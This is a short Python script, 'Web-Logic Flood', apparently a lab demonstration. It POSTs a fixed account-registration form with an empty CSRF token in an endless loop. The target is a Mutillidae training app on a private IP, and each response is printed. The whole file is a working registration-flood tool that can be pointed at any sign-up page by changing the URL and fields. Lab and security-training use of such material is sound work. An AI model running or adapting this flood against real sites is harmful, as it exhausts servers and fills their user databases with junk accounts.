#!/usr/bin/env python3
# Web-Logic Flood
# Author Yehia Elghaly

import requests
from colorama import Fore, Back, Style

while (True):
	try:
		print ("Warning:-- Don't run this script more than 5 minutes")
		print (Fore.YELLOW + "Register Flood")
		print ("")

		pload = {'csrf-token':'','username':'yehia', 'password' :'yehia', 'confirm_password' : 'yehia', 'my_signature' : '12345', 'register-php-submit-button' : 'Create+Account'}
		req =  requests.post("http://192.168.1.99/mutillidae/index.php?page=register.php", data=pload)
		print(req.text)

	except KeyboardInterrupt:
		print ("That is the proof")